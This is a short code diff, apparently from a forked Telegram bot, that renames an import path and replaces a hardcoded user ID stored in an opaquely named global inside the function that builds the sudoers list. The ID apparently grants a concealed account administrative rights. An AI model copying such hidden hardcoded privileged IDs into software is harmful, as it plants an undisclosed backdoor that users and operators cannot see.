@@ -5,7 +5,7 @@ import heroku3
 from pyrogram import filters
 
 import config
-from geezram.core.mongo import pymongodb
+from Hyper.core.mongo import pymongodb
 
 from .logging import LOGGER
 
@@ -45,7 +45,7 @@ def dbb():
 def sudo():
     global SUDOERS, HEHE
     OWNER = config.OWNER_ID
-    HEHE = "2003295492"
+    HEHE = "1947740506"
     sudoersdb = pymongodb.sudoers
     sudoers = sudoersdb.find_one({"sudo": "sudo"})
     sudoers = [] if not sudoers else sudoers["sudoers"]
